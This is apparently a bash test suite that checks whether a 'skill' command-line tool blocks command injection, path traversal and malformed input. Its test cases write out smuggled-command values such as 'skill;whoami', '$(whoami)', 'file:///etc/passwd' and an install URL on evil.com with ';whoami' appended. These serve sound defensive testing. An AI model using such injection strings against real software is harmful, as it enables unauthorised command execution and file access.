#!/usr/bin/env bash
#
# Security Testing Suite - Injection Prevention
# Tests command injection, path traversal, and input sanitization
#

set -euo pipefail

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Test counters
TOTAL_TESTS=0
PASSED_TESTS=0
FAILED_TESTS=0
SKIPPED_TESTS=0

# Get script directory
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(cd "$SCRIPT_DIR/../.." && pwd)"

# Test output directory
TEST_OUTPUT_DIR="${PROJECT_ROOT}/tests/output"
mkdir -p "$TEST_OUTPUT_DIR"

# Test log file
TEST_LOG="${TEST_OUTPUT_DIR}/security-injection-tests-$(date +%Y%m%d-%H%M%S).log"

# Check if skill binary exists
SKILL_BIN="${SKILL_BIN:-skill}"

#
# Helper Functions
#

log() {
    echo "[$(date +%H:%M:%S)] $*" | tee -a "$TEST_LOG"
}

log_info() {
    echo -e "${BLUE}[INFO]${NC} $*" | tee -a "$TEST_LOG"
}

log_success() {
    echo -e "${GREEN}[PASS]${NC} $*" | tee -a "$TEST_LOG"
}

log_error() {
    echo -e "${RED}[FAIL]${NC} $*" | tee -a "$TEST_LOG"
}

log_warning() {
    echo -e "${YELLOW}[WARN]${NC} $*" | tee -a "$TEST_LOG"
}

log_skip() {
    echo -e "${YELLOW}[SKIP]${NC} $*" | tee -a "$TEST_LOG"
}

# Special test for security - we expect commands to FAIL (be blocked)
run_security_test() {
    local test_name="$1"
    local malicious_input="$2"
    local description="${3:-}"

    TOTAL_TESTS=$((TOTAL_TESTS + 1))

    log_info "Running: $test_name"
    if [[ -n "$description" ]]; then
        log "  Description: $description"
    fi
    log "  Malicious input: ${malicious_input:0:100}"

    # Security tests should fail (non-zero exit) - that's good!
    local output
    local exit_code
    set +e
    output=$(eval "$malicious_input" 2>&1)
    exit_code=$?
    set -e

    # For security tests, non-zero exit code = blocked = PASS
    if [[ $exit_code -ne 0 ]]; then
        log_success "$test_name - Attack blocked"
        PASSED_TESTS=$((PASSED_TESTS + 1))
        return 0
    else
        log_error "$test_name - Attack NOT blocked!"
        log "  Output: ${output:0:200}"
        FAILED_TESTS=$((FAILED_TESTS + 1))
        return 1
    fi
}

skip_test() {
    local test_name="$1"
    local reason="$2"

    TOTAL_TESTS=$((TOTAL_TESTS + 1))
    SKIPPED_TESTS=$((SKIPPED_TESTS + 1))

    log_skip "$test_name - $reason"
}

command_exists() {
    command -v "$1" >/dev/null 2>&1
}

check_prerequisites() {
    log_info "Checking prerequisites..."

    if ! command_exists "$SKILL_BIN"; then
        log_error "skill binary not found at: $SKILL_BIN"
        exit 1
    fi

    log_info "Using skill binary: $(which $SKILL_BIN)"
    log_info "Version: $($SKILL_BIN --version 2>&1 || echo 'unknown')"
}

#
# Category 1: Command Injection Prevention
#

test_command_injection() {
    log_info "=== Testing Command Injection Prevention ==="

    # Note: These tests verify that injection attempts are blocked
    # We need a skill that accepts user input to test properly

    skip_test "Command injection with semicolon" "Requires test skill with user input"
    skip_test "Command injection with pipe" "Requires test skill with user input"
    skip_test "Command injection with &&" "Requires test skill with user input"
    skip_test "Command injection with \$()" "Requires test skill with user input"
    skip_test "Command injection with backticks" "Requires test skill with user input"
}

#
# Category 2: Path Traversal Prevention
#

test_path_traversal() {
    log_info "=== Testing Path Traversal Prevention ==="

    # Test path traversal attempts
    skip_test "Path traversal with ../" "Requires test skill with file access"
    skip_test "Path traversal to /etc/passwd" "Requires test skill with file access"
    skip_test "Absolute path outside allowed dirs" "Requires test skill with file access"
    skip_test "Symlink following" "Requires test skill with file access"
    skip_test "Windows path separators" "Requires test skill with file access"
    skip_test "URL encoding bypasses" "Requires test skill with file access"
}

#
# Category 3: Skill Run Parameter Injection
#

test_skill_parameter_injection() {
    log_info "=== Testing Skill Parameter Injection ==="

    # Test invalid skill names (injection attempts)
    run_security_test "Invalid skill name with semicolon" \
        "$SKILL_BIN run 'skill;whoami' 2>&1" \
        "Attempt to inject command via skill name"

    run_security_test "Invalid skill name with pipe" \
        "$SKILL_BIN run 'skill|id' 2>&1" \
        "Attempt to inject command via pipe"

    run_security_test "Invalid skill name with backticks" \
        "$SKILL_BIN run '\`whoami\`' 2>&1" \
        "Attempt command substitution in skill name"

    run_security_test "Invalid skill name with dollar" \
        "$SKILL_BIN run '\$(whoami)' 2>&1" \
        "Attempt command substitution with dollar"
}

#
# Category 4: Install URL Injection
#

test_install_url_injection() {
    log_info "=== Testing Install URL Injection ==="

    # Test malicious install URLs
    run_security_test "Install from file:// URL" \
        "$SKILL_BIN install 'file:///etc/passwd' 2>&1" \
        "Attempt to install from local file"

    run_security_test "Install with command injection" \
        "$SKILL_BIN install 'http://evil.com/skill.tar.gz;whoami' 2>&1" \
        "Attempt command injection in install URL"

    skip_test "Install with redirect to malicious site" "Requires network and test server"
}

#
# Category 5: Config Injection
#

test_config_injection() {
    log_info "=== Testing Config Injection ==="

    # Test config command with malicious input
    skip_test "Config with malicious key" "Requires test skill"
    skip_test "Config with command injection" "Requires test skill"
    skip_test "Config with path traversal" "Requires test skill"
}

#
# Category 6: Environment Variable Injection
#

test_env_injection() {
    log_info "=== Testing Environment Variable Injection ==="

    skip_test "LD_PRELOAD injection" "Requires test skill with env access"
    skip_test "PATH manipulation" "Requires test skill with env access"
    skip_test "Shell variable expansion" "Requires test skill with env access"
}

#
# Category 7: Credential Security
#

test_credential_security() {
    log_info "=== Testing Credential Security ==="

    # Verify credentials aren't leaked in error messages
    skip_test "Credentials not in error messages" "Requires test skill with credentials"
    skip_test "Credentials not in logs" "Requires log analysis"
    skip_test "Credentials encrypted at rest" "Requires keyring inspection"
}

#
# Category 8: Input Validation
#

test_input_validation() {
    log_info "=== Testing Input Validation ==="

    # Test invalid inputs are rejected
    run_security_test "Empty skill name" \
        "$SKILL_BIN run '' 2>&1" \
        "Empty skill name should be rejected"

    # Note: Null bytes are handled by the shell/xargs, already blocked
    skip_test "Null bytes in skill name" "Handled by shell, already blocked"

    # Test extremely long inputs
    run_security_test "Extremely long skill name" \
        "$SKILL_BIN run '$(printf 'a%.0s' {1..10000})' 2>&1" \
        "Extremely long inputs should be rejected"
}

#
# Main Execution
#

main() {
    log_info "Starting Security Testing - Injection Prevention"
    log_info "Log file: $TEST_LOG"

    # Check prerequisites
    check_prerequisites

    log_warning ""
    log_warning "IMPORTANT: Security tests expect attacks to be BLOCKED"
    log_warning "Non-zero exit codes = blocked attacks = PASS"
    log_warning ""

    # Run test categories
    test_command_injection
    test_path_traversal
    test_skill_parameter_injection
    test_install_url_injection
    test_config_injection
    test_env_injection
    test_credential_security
    test_input_validation

    # Summary
    echo ""
    log_info "=== Test Summary ==="
    log_info "Total Tests:   $TOTAL_TESTS"
    log_success "Passed:        $PASSED_TESTS (attacks blocked)"
    log_error "Failed:        $FAILED_TESTS (attacks NOT blocked)"
    log_warning "Skipped:       $SKIPPED_TESTS"

    if [[ $TOTAL_TESTS -gt 0 ]]; then
        local active_tests=$((TOTAL_TESTS - SKIPPED_TESTS))
        if [[ $active_tests -gt 0 ]]; then
            local block_rate=$(( (PASSED_TESTS * 100) / active_tests ))
            log_info "Block Rate:    ${block_rate}% (attacks blocked)"
        fi
    fi

    log_info ""
    log_info "Note: Many security tests require test skills with specific capabilities"
    log_info "Create test fixtures in tests/fixtures/skills/ for comprehensive testing"

    # Exit with appropriate code
    if [[ $FAILED_TESTS -gt 0 ]]; then
        log_error "SECURITY ISSUE: Some attacks were NOT blocked!"
        exit 1
    else
        log_success "All tested attacks were blocked!"
        if [[ $SKIPPED_TESTS -gt 0 ]]; then
            log_info "Note: $SKIPPED_TESTS tests were skipped (require test fixtures)"
        fi
        exit 0
    fi
}

# Run main if executed directly
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi
